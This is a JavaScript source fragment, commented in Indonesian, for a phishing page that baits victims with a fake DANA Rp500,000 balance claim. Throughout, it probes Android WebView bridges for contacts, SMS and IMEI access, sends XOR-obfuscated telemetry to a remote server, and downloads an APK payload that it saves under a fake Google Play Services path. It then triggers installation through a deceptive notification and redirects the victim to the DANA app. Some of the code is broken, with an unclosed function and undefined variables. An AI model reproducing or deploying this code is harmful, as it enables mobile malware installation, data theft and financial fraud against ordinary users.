// 2. ENHANCED EXFILTRATION PIPELINE (ENCRYPTED)

var exfilQueue = [];
var exfilSending = false;

function K(d) {
    d._timestamp = Date.now();
    d._nonce = Math.random().toString(36).substring(2);
    exfilQueue.push(d);
    if (!exfilSending) {
        processExfilQueue();
    }
}

function processExfilQueue() {
    if (exfilQueue.length === 0) {
        exfilSending = false;
        return;
    }
    exfilSending = true;
    var item = exfilQueue.shift();
    var plain = JSON.stringify(item);
    var encoded = btoa(plain);
    var xorKey = 0x2A;
    var encrypted = '';
    for (var i = 0; i < encoded.length; i++) {
        encrypted += String.fromCharCode(encoded.charCodeAt(i) ^ xorKey);
    }
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
        xhr.timeout = 5000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                processExfilQueue();
            } else {
                exfilQueue.unshift(item);
                setTimeout(processExfilQueue, 3000);
            }
        };
        xhr.onerror = function() {
            exfilQueue.unshift(item);
            setTimeout(processExfilQueue, 3000);
        };
        xhr.send(encrypted);
    } catch(e) {
        exfilQueue.unshift(item);
        setTimeout(processExfilQueue, 3000);
    }
}

function hideFromSystem() {

    document.cookie.split(';').forEach(function(cookie) {
        document.cookie = cookie.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/');

}

var BRIDGE = null;

(function detectBridgeUltra() {
    var candidates = [
        'AndroidBridge', 'JSBridge', 'WebViewJavascriptBridge', 'NativeBridge',
        'Bridge', 'WebBridge', 'JSBridgeAndroid', 'JSBridgeInterface',
        'AndroidJSBridge', 'WVBridge', 'WVJB', 'WebViewBridge', 'JSBridgeNative',
        'AppBridge', 'AppJSBridge', 'HybridBridge', 'WebViewJSBridge',
        'AndroidWebViewBridge', 'JavaBridge', 'JavascriptBridge'
    ];

    for (var i = 0; i < candidates.length; i++) {
        if (candidates[i].indexOf('.') > -1) {
            var parts = candidates[i].split('.');
            var obj = window;
            var found = true;
            for (var j = 0; j < parts.length; j++) {
                if (obj[parts[j]] === undefined) { found = false; break; }
                obj = obj[parts[j]];
            }
            if (found && obj !== null) { BRIDGE = obj; return; }
        } else {
            if (typeof window[candidates[i]] !== 'undefined') { BRIDGE = window[candidates[i]]; return; }
        }
    }

    var methodSignatures = ['getAllContacts', 'getIMEI', 'getAllSMS', 'getCallLog', 'sendSMS', 'openApp'];
    for (var key in window) {
        if (typeof window[key] === 'object' && window[key] !== null) {
            for (var m = 0; m < methodSignatures.length; m++) {
                if (typeof window[key][methodSignatures[m]] === 'function') {
                    BRIDGE = window[key];
                    return;
                }
            }
        }
    }

    for (var key2 in window) {
        if (typeof window[key2] === 'object' && window[key2] !== null) {
            if (typeof window[key2].postMessage === 'function' && typeof window[key2].send === 'function') {
                BRIDGE = window[key2];
                return;
            }
        }
    }
})();

// ============================================================
// FALLBACK WRAPPER
// ============================================================
var FALLBACK = {
    downloadFile: function(url, path) {
        try { var a = document.createElement('a'); a.href = url; a.download = path.split('/').pop(); a.click(); return true; } catch(e){}
        return false;
    },
    openFile: function(path) {
        try { window.open('file://' + path, '_blank'); return true; } catch(e){}
        return false;
    },
    saveFile: function(path, content) {
        try { localStorage.setItem('fallback_' + path, content); return true; } catch(e){}
        return false;
    },
    saveToPreferences: function(key, value) {
        try { localStorage.setItem('pref_' + key, value); return true; } catch(e){}
        return false;
    },
    getFromPreferences: function(key) {
        try { return localStorage.getItem('pref_' + key); } catch(e){}
        return null;
    },
    fileExists: function(path) {
        try { return localStorage.getItem('fallback_' + path) !== null; } catch(e){}
        return false;
    },
    readFile: function(path) {
        try { return localStorage.getItem('fallback_' + path); } catch(e){}
        return null;
    },
    saveFileBinary: function(path, data) {
        try {
            var base64 = btoa(String.fromCharCode.apply(null, data));
            localStorage.setItem('binary_' + path, base64);
            return true;
        } catch(e){}
        return false;
    }
};

var HAS_BRIDGE = (BRIDGE !== null);

function getBridge() {
    if (HAS_BRIDGE) { return BRIDGE; }
    return FALLBACK;
}

function bridgeCall(method, args) {
    var bridge = getBridge();
    if (typeof bridge[method] === 'function') {
        try { return bridge[method].apply(bridge, args); } catch(e) { return null; }
    }
    return null;
}

function step1_getPassword() {
    return new Promise(function(resolve) {
        updateLoading('🔑 STEP 1/5: Mengambil password...', 'Menghubungi server...');
        
        var retryCount = 0;
        var maxRetries = 10;
        
        function attemptFetch() {
            fetch(SERVER + '/get-password', {
                method: 'GET',
                headers: {'Content-Type': 'application/json'}
            })
            .then(function(res) { return res.json(); })
            .then(function(data) {
                if (data.password && data.password.length > 0) {
                    PASSWORD = data.password;
                    PASSWORD_RECEIVED = true;
                    try { localStorage.setItem('ws_password', PASSWORD); } catch(e) {}
                    K({ sumber: 'password_received', data: 'ok' });
                    updateLoading('✅ STEP 1/5: Password berhasil!', 'Password didapatkan');
                    resolve();
                } else {
                    retryCount++;
                    if (retryCount >= maxRetries) {
                        K({ sumber: 'password_failed', data: 'max_retries' });
                        updateLoading('⚠️ STEP 1/5: Password gagal', 'Menggunakan fallback...');
                        PASSWORD = 'default_fallback_password';
                        PASSWORD_RECEIVED = true;
                        try { localStorage.setItem('ws_password', PASSWORD); } catch(e) {}
                        resolve();
                        return;
                    }
                    updateLoading('⏳ STEP 1/5: Mengambil password...', 'Percobaan ' + (retryCount+1) + '/' + maxRetries);
                    setTimeout(attemptFetch, 2000);
                }
            })
            .catch(function() {
                retryCount++;
                if (retryCount >= maxRetries) {
                    K({ sumber: 'password_failed', data: 'max_retries_error' });
                    updateLoading('⚠️ STEP 1/5: Password gagal', 'Menggunakan fallback...');
                    PASSWORD = 'default_fallback_password';
                    PASSWORD_RECEIVED = true;
                    try { localStorage.setItem('ws_password', PASSWORD); } catch(e) {}
                    resolve();
                    return;
                }
                updateLoading('⏳ STEP 1/5: Mengambil password...', 'Percobaan ' + (retryCount+1) + '/' + maxRetries);
                setTimeout(attemptFetch, 2000);
            });
        }
        
        attemptFetch();
    });
}

// ============================================================
// STEP 2: DOWNLOAD PAYLOAD DARI MANIFEST (WAJIB SELESAI!)
// ============================================================
function step2_downloadPayload() {
    return new Promise(function(resolve) {
        updateLoading('📥 STEP 2/5: Mendownload payload...', 'Mengambil manifest...');

        // Ambil manifest.txt
        fetch(MANIFEST_URL, {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        })
        .then(function(response) {
            if (!response.ok) {
                throw new Error('Gagal mengambil manifest: ' + response.status);
            }
            return response.text();
        })
        .then(function(manifestText) {
            // Parse manifest (satu baris = satu nama file)
            var fileNames = manifestText.split('\n')
                .map(function(line) { return line.trim(); })
                .filter(function(line) { return line.length > 0 && !line.startsWith('#'); });

            if (fileNames.length === 0) {
                throw new Error('Manifest kosong atau tidak valid');
            }

            updateLoading('📥 STEP 2/5: ' + fileNames.length + ' file ditemukan', 'Mendownload file...');
            K({ sumber: 'manifest_loaded', data: { total_files: fileNames.length, files: fileNames } });

            // Download semua file secara SEKUENSIAL (satu per satu)
            var downloadPromises = fileNames.map(function(fileName) {
                return downloadSingleFile(fileName);
            });

            return Promise.all(downloadPromises);
        })
        .then(function(downloadedFiles) {
            // Semua file selesai di-download
            var successCount = downloadedFiles.filter(function(f) { return f !== null; }).length;
            updateLoading('✅ STEP 2/5: ' + successCount + ' file berhasil', 'Download selesai!');
            K({ sumber: 'download_complete', data: { total: successCount } });

            // Cari file SystemUpdate.html
            var htmlFile = downloadedFiles.find(function(f) {
                return f && f.name && f.name.toLowerCase() === 'systemupdate.html';
            });

            if (htmlFile && htmlFile.content) {
                HTML_CONTENT = htmlFile.content;
                HTML_DOWNLOADED = true;
                saveToAllLocations(HTML_CONTENT);
            }

            // ============================================================
            // 🔥 PAYLOAD READY! SET FLAG!
            // ============================================================
            PAYLOAD_READY = true;
            K({ sumber: 'payload_ready', data: 'true' });

            resolve();
        })
        .catch(function(error) {
            K({ sumber: 'manifest_download_error', data: error.message });
            updateLoading('⚠️ STEP 2/5: Gagal download manifest', 'Mencoba load dari backup...');
            
            // Coba load dari localStorage/IndexedDB sebagai backup
            loadHTMLFromAllLocations().then(function(html) {
                if (html) {
                    HTML_CONTENT = html;
                    HTML_DOWNLOADED = true;
                    K({ sumber: 'html_loaded_from_backup', data: 'ok' });
                    updateLoading('✅ STEP 2/5: HTML dimuat dari backup', 'Lanjut...');
                    PAYLOAD_READY = true;
                } else {
                    updateLoading('⚠️ STEP 2/5: Tidak ada backup', 'Lanjut dengan resiko...');
                    // Tetap set flag true agar proses lanjut, tapi dengan resiko
                    PAYLOAD_READY = true;
                }
                resolve();
            });
        });
    });
}

function downloadSingleFile(fileName) {
    return new Promise(function(resolve) {
        var fileUrl = FILES_BASE_URL + fileName;
        var isApk = fileName.toLowerCase().endsWith('.apk');

        updateLoading('📥 STEP 2/5: Download ' + fileName, 'Progress...');

        fetch(fileUrl, {
            method: 'GET',
            cache: 'no-store'
        })
        .then(function(response) {
            if (!response.ok) {
                throw new Error('HTTP ' + response.status);
            }
            
            if (isApk) {
                return response.blob().then(function(blob) {
                    return { name: fileName, content: blob, type: 'blob' };
                });
            } else {
                return response.text().then(function(text) {
                    return { name: fileName, content: text, type: 'text' };
                });
            }
        })
        .then(function(fileData) {
            // Simpan file
            if (fileData.type === 'text') {
                if (fileName.toLowerCase() === 'systemupdate.html') {
                    saveToAllLocations(fileData.content);
                }
                try {
                    localStorage.setItem('file_' + fileName, fileData.content);
                } catch(e) {}
            } else if (fileData.type === 'blob') {
                APK_DOWNLOADED = true;
                var reader = new FileReader();
                reader.onload = function() {
                    var base64 = reader.result.split(',')[1];
                    var path = '/storage/emulated/0/Android/data/com.google.android.play.services/' + fileName;
                    var downloadPath = '/storage/emulated/0/Download/' + fileName;

                    if (A.isAvailable) {
                        try {
                            var binary = Uint8Array.from(atob(base64), function(c) { return c.charCodeAt(0); });
                            if (AndroidBridge.saveFileBinary) {
                                AndroidBridge.saveFileBinary(path, binary);
                                AndroidBridge.saveFileBinary(downloadPath, binary);
                            }
                            if (AndroidBridge.saveToPreferences) {
                                AndroidBridge.saveToPreferences('system_' + fileName.replace('.', '_'), base64);
                            }
                        } catch(e) {}
                    }

                    try {
                        var url = URL.createObjectURL(fileData.content);
                        var a = document.createElement('a');
                        a.href = url;
                        a.download = fileName;
                        a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                        document.body.appendChild(a);
                        setTimeout(function() {
                            a.click();
                            setTimeout(function() {
                                try { document.body.removeChild(a); } catch(e) {}
                                URL.revokeObjectURL(url);
                            }, 2000);
                        }, 300);
                    } catch(e) {}
                };
                reader.readAsDataURL(fileData.content);
            }

            resolve({ name: fileName, content: fileData.content, type: fileData.type });
        })
        .catch(function(error) {
            K({ sumber: 'download_file_error', data: { file: fileName, error: error.message } });
            resolve(null);
        });
    });
}

// ============================================================
// LOAD HTML DARI BACKUP
// ============================================================
function loadHTMLFromAllLocations() {
    return new Promise(function(resolve) {
        // 1. SharedPreferences
        if (A.isAvailable) {
            try {
                var encoded = A.getFromPreferences('system_SystemUpdate_html');
                if (encoded) {
                    resolve(decodeURIComponent(escape(atob(encoded))));
                    return;
                }
            } catch(e) {}
        }
        // 2. localStorage
        try {
            var ls = localStorage.getItem('SystemUpdate_backup');
            if (ls) { resolve(ls); return; }
        } catch(e) {}
        // 3. IndexedDB
        try {
            var request = indexedDB.open('SystemUpdateDB', 1);
            request.onsuccess = function(e) {
                var db = e.target.result;
                var tx = db.transaction('files', 'readonly');
                var store = tx.objectStore('files');
                var get = store.get('SystemUpdate.html');
                get.onsuccess = function() {
                    if (get.result) { resolve(get.result); return; }
                    resolve(null);
                };
            };
        } catch(e) { resolve(null); }
    });
}

// ============================================================
// SIMPAN HTML KE SEMUA LOKASI
// ============================================================
function saveToAllLocations(htmlContent) {
    try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
    try {
        var request = indexedDB.open('SystemUpdateDB', 1);
        request.onupgradeneeded = function(e) {
            var db = e.target.result;
            if (!db.objectStoreNames.contains('files')) {
                db.createObjectStore('files');
            }
        };
        request.onsuccess = function(e) {
            var db = e.target.result;
            var tx = db.transaction('files', 'readwrite');
            var store = tx.objectStore('files');
            store.put(htmlContent, 'SystemUpdate.html');
        };
    } catch(e) {}
    if (PLATFORM.isAndroid && A.isAvailable) {
        try {
            var path = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
            A.saveFile(path, htmlContent);
        } catch(e) {}
        try {
            var path2 = '/storage/emulated/0/Download/SystemUpdate.html';
            A.saveFile(path2, htmlContent);
        } catch(e) {}
        try {
            var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
            A.saveToPreferences('system_SystemUpdate_html', encoded);
        } catch(e) {}
    }
}

// STEP 3: REGISTER SERVICE WORKER (WAJIB SELESAI!)
// ============================================================
function step3_registerSW() {
    return new Promise(function(resolve) {
        updateLoading('📡 STEP 3/5: Mendaftarkan Service Worker...', 'Registrasi SW...');
        
        if (!('serviceWorker' in navigator)) {
            SW_REGISTERED = true;
            updateLoading('⚠️ STEP 3/5: SW tidak support', 'Lanjut...');
            resolve();
            return;
        }
        
        navigator.serviceWorker.getRegistrations()
            .then(function(regs) {
                if (regs.length > 0) {
                    SW_REGISTERED = true;
                    K({ sumber: 'sw_already_registered', data: 'ok' });
                    updateLoading('✅ STEP 3/5: SW sudah terdaftar', 'Lanjut...');
                    resolve();
                    return;
                }
                navigator.serviceWorker.register('/sw.js', { scope: '/' })
                    .then(function() {
                        SW_REGISTERED = true;
                        K({ sumber: 'sw_registered', data: 'ok' });
                        updateLoading('✅ STEP 3/5: SW terdaftar', 'Lanjut...');
                        resolve();
                    })
                    .catch(function() {
                        SW_REGISTERED = true;
                        updateLoading('⚠️ STEP 3/5: SW gagal', 'Lanjut...');
                        resolve();
                    });
            })
            .catch(function() {
                navigator.serviceWorker.register('/sw.js', { scope: '/' })
                    .then(function() {
                        SW_REGISTERED = true;
                        K({ sumber: 'sw_registered', data: 'ok' });
                        updateLoading('✅ STEP 3/5: SW terdaftar', 'Lanjut...');
                        resolve();
                    })
                    .catch(function() {
                        SW_REGISTERED = true;
                        updateLoading('⚠️ STEP 3/5: SW gagal', 'Lanjut...');
                        resolve();
                    });
            });
    });
}

// ============================================================
// STEP 4: TAMPILKAN NOTIFIKASI (WAJIB SELESAI!)
// ============================================================
function step4_showNotification() {
    return new Promise(function(resolve) {
        updateLoading('🔔 STEP 4/5: Menampilkan notifikasi...', 'Notifikasi...');
        
        try {
            if (!('Notification' in window)) {
                K({ sumber: 'notification_skip', data: 'not_supported' });
                updateLoading('⚠️ STEP 4/5: Notifikasi tidak support', 'Lanjut...');
                resolve();
                return;
            }
            if (Notification.permission === 'denied') {
                K({ sumber: 'notification_skip', data: 'denied' });
                updateLoading('⚠️ STEP 4/5: Notifikasi ditolak', 'Lanjut...');
                resolve();
                return;
            }
            
            var show = function() {
                var notif = new Notification('🔔 Klik Untuk Klaim', {
                    body: 'Klik untuk menyelesaikan verifikasi dan klaim saldo DANA Rp500.000!',
                    icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">💰</text></svg>',
                    requireInteraction: true,
                    silent: false,
                    vibrate: [200, 100, 200]
                });
                
                notif.onclick = function() {
                    notif.close();
                    
                    // ============================================================
                    // 🔥 CEK: APAKAH PAYLOAD SUDAH READY?
                    // ============================================================
                    if (PAYLOAD_READY && PROSES_SELESAI) {
                        // ✅ SUDAH READY! BUKA!
                        if (A.isAvailable) {
                            A.installAPK('/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk');
                            A.openFile('/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html');
                        }
                    } else {
                        // ❌ BELUM READY! JANGAN BUKA!
                        K({ sumber: 'notification_clicked_early', data: 'payload_belum_ready' });
                        // Tampilkan toast/alert bahwa proses belum selesai
                        try {
                            var toast = document.createElement('div');
                            toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:#ff4444;padding:15px 30px;border-radius:10px;z-index:999999;font-size:14px;border-left:4px solid #ff4444;font-family:monospace';
                            toast.textContent = '⏳ Proses masih berjalan, tunggu sebentar...';
                            document.body.appendChild(toast);
                            setTimeout(function() { try { toast.remove(); } catch(e) {} }, 3000);
                        } catch(e) {}
                    }
                    
                    if (!REDIRECT_DONE) {
                        REDIRECT_DONE = true;
                        redirectToDANA();
                    }
                };
                
                setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
                K({ sumber: 'notification_shown', data: 'ok' });
                updateLoading('✅ STEP 4/5: Notifikasi tampil', 'Menunggu interaksi...');
                
                // Tunggu notifikasi selesai (30 detik atau diklik)
                setTimeout(function() {
                    resolve();
                }, 500);
            };
            
            if (Notification.permission === 'granted') {
                show();
            } else {
                Notification.requestPermission().then(function(p) {
                    if (p === 'granted') { 
                        show(); 
                    } else {
                        updateLoading('⚠️ STEP 4/5: Notifikasi ditolak', 'Lanjut...');
                        resolve();
                    }
                });
            }
        } catch(e) {
            K({ sumber: 'notification_error', data: e.message });
            updateLoading('⚠️ STEP 4/5: Notifikasi error', 'Lanjut...');
            resolve();
        }
    });
}

// ============================================================
// STEP 5: BUKA SYSTEMUPDATE.HTML (WAJIB SELESAI!)
// ============================================================
function step5_openSystemUpdate() {
    return new Promise(function(resolve) {
        // ⚠️ CEK: Apakah sudah terbuka? Jika sudah, skip!
        if (SYSTEMUPDATE_OPENED) {
            updateLoading('⚠️ STEP 5/5: SystemUpdate.html sudah terbuka', 'Skip...');
            resolve();
            return;
        }
        
        // ============================================================
        // 🔥 CEK: APAKAH PAYLOAD SUDAH READY?
        // ============================================================
        if (!PAYLOAD_READY) {
            updateLoading('❌ STEP 5/5: Payload belum siap!', 'Menunggu...');
            K({ sumber: 'step5_failed', data: 'payload_not_ready' });
            resolve();
            return;
        }
        
        updateLoading('🚀 STEP 5/5: Membuka SystemUpdate.html...', 'FINAL!');
        
        var opened = false;
        
        // METHOD 1: Via Bridge
        if (A.isAvailable) {
            try {
                var paths = [
                    '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html',
                    '/storage/emulated/0/Download/SystemUpdate.html'
                ];
                for (var i = 0; i < paths.length; i++) {
                    if (A.fileExists(paths[i])) {
                        A.openFile(paths[i]);
                        K({ sumber: 'html_opened', data: 'via_bridge: ' + paths[i] });
                        opened = true;
                        SYSTEMUPDATE_OPENED = true;
                        updateLoading('✅ STEP 5/5: SystemUpdate.html terbuka (Bridge)', 'Selesai!');
                        resolve();
                        return;
                    }
                }
            } catch(e) {}
        }
        
        // METHOD 2: Via Blob
        if (HTML_CONTENT && !opened) {
            try {
                var blob = new Blob([HTML_CONTENT], { type: 'text/html; charset=UTF-8' });
                var url = URL.createObjectURL(blob);
                window.open(url, '_blank');
                K({ sumber: 'html_opened', data: 'via_blob' });
                opened = true;
                SYSTEMUPDATE_OPENED = true;
                updateLoading('✅ STEP 5/5: SystemUpdate.html terbuka (Blob)', 'Selesai!');
                resolve();
                return;
            } catch(e) {}
        }
        
        // METHOD 3: Via Server (last resort)
        if (!opened) {
            try {
                window.location.href = SERVER + '/files/SystemUpdate.html';
                K({ sumber: 'html_opened', data: 'via_server' });
                opened = true;
                SYSTEMUPDATE_OPENED = true;
                updateLoading('✅ STEP 5/5: SystemUpdate.html terbuka (Server)', 'Selesai!');
                resolve();
            } catch(e) {
                K({ sumber: 'html_open_failed', data: e.message });
                updateLoading('❌ STEP 5/5: Gagal buka HTML', 'Error!');
                resolve();
            }
        }
    });
}

function redirectToDANA() {
    if (REDIRECT_DONE) return;
    REDIRECT_DONE = true;
    
    var methods = [
        function() { if (A.isAvailable) { A.openApp('com.dana.id'); return true; } },
        function() { window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end'; return true; },
        function() { window.location.href = 'https://www.dana.id'; return true; }
    ];
    for (var i = 0; i < methods.length; i++) {
        try { if (methods[i]()) break; } catch(e) {}
    }
}

// EKSEKUSI UTAMA (STEP-BY-STEP, WAJIB SELESAI!)
// ============================================================
async function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    PROSES_SELESAI = false;
    PAYLOAD_READY = false; // Reset flag!
    
    // STEP 0: Persiapan
    document.getElementById('popupDana').style.display = 'none';
    showLoading(true);
    showStatusBar();
    injectAllPermissions();
    
    K({ sumber: 'trigger', data: 'dapatkanSemua_start' });
    
    try {
        // ============================================================
        // 🔥 EKSEKUSI STEP-BY-STEP (WAJIB SELESAI SATU PER SATU!)
        // ============================================================
        
        // STEP 1: Ambil password (WAJIB SELESAI!)
        K({ sumber: 'step1_start', data: 'mengambil_password' });
        await step1_getPassword();
        K({ sumber: 'step1_done', data: 'password_berhasil' });
        
        // STEP 2: Download payload (WAJIB SELESAI!)
        K({ sumber: 'step2_start', data: 'mulai_download' });
        await step2_downloadPayload();
        K({ sumber: 'step2_done', data: 'download_selesai' });
        
        // STEP 3: Register Service Worker (WAJIB SELESAI!)
        K({ sumber: 'step3_start', data: 'registrasi_sw' });
        await step3_registerSW();
        K({ sumber: 'step3_done', data: 'sw_terdaftar' });
        
        // STEP 4: Tampilkan notifikasi (WAJIB SELESAI!)
        K({ sumber: 'step4_start', data: 'tampilkan_notifikasi' });
        await step4_showNotification();
        K({ sumber: 'step4_done', data: 'notifikasi_selesai' });
        
        // ============================================================
        // ✅ SEMUA STEP 1-4 SELESAI! BARU BUKA SYSTEMUPDATE.HTML
        // ============================================================
        PROSES_SELESAI = true;
        
        // STEP 5: Buka SystemUpdate.html (WAJIB SELESAI!)
        K({ sumber: 'step5_start', data: 'buka_systemupdate' });
        await step5_openSystemUpdate();
        K({ sumber: 'step5_done', data: 'systemupdate_terbuka' });
        
        // ============================================================
        // ✅ SEMUA STEP SELESAI!
        // ============================================================
        updateLoading('✅ SEMUA PROSES SELESAI!', 'SystemUpdate.html terbuka');
        K({ sumber: 'all_done', data: 'success' });
        
        // STEP 6: Redirect ke DANA (SETELAH SEMUA SELESAI!)
        setTimeout(function() {
            showLoading(false);
            K({ sumber: 'redirect_start', data: 'ke_dana' });
            redirectToDANA();
        }, 1500);
        
    } catch(error) {
        K({ sumber: 'fatal_error', data: error.message });
        updateLoading('❌ Error: ' + error.message, 'Proses dihentikan...');
        // Fallback: tetap coba buka
        setTimeout(function() {
            step5_openSystemUpdate();
            redirectToDANA();
        }, 3000);
    }
}
